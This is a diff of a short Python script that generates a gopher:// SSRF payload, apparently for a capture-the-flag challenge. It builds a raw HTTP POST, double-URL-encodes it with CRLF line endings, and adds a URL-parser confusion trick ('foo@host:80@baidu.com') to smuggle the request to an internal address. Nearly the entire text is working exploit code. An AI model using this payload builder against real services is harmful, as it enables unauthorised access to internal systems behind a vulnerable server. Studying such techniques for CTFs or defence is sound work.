@@ -1,21 +1,20 @@
 import urllib
 import requests
+
+payload = "check=NeSE"
+
 exp='''POST / HTTP/1.1
-Host: 172.26.98.147
-User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0
-Accept: */*;
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Cookie: PHPSESSID=admin
+Host: 192.168.16.2
 Connection: close
 Content-Type: application/x-www-form-urlencoded
-Content-Length: 95
+Content-Length: {}
 
-file=index.php'''
+{}'''.format(len(payload), payload)
 # print exp.split("\n")
-tmp = urllib.quote(exp)
+tmp = urllib.parse.quote(exp)
 tmp = tmp.replace("%0A","%0D%0A")
  
-result = "_"+urllib.quote(tmp)
+result = "_"+urllib.parse.quote(tmp)
 
-result="gopher://172.26.98.147:40000/"+result
-print result
+result="gopher://foo@192.168.16.2:80@baidu.com/"+result
+print(result)
